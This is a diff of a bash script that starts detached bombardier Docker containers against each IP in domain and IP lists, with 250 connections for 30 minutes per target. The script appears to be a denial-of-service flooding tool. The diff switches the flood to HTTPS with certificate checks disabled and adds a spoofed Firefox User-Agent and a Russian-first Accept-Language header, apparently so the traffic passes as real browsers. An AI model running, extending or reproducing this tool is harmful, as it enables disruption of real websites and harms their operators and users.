@@ -3,10 +3,12 @@ source libs/file.sh
 source libs/exit.sh
 source libs/echo.sh
 
+proto=https
 connections=250
 duration=1800
 domains_filename=domains.txt
 ips_filename=ips.txt
+
 
 function parse_args {
 	while [ : ]
@@ -85,9 +87,14 @@ function main {
 
 	function cb {
 		ip=$1
-		url="http://$ip"
+		url="${proto}://$ip"
 
-		docker run -d alpine/bombardier -c $connections -d "${duration}s" -l $url &>-
+		docker run -d alpine/bombardier -c $connections -d "${duration}s" \
+		-H="User-Agent: Mozilla/5.0 (X11; Debian; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" \
+		-H="Accept-Language: ru-RU, ru;q=0.9, en-US;q=0.8, en;q=0.7" \
+		-insecure \
+		-l \
+		$url &>-
 			
 		if [ $? -ne 0 ]
 		then
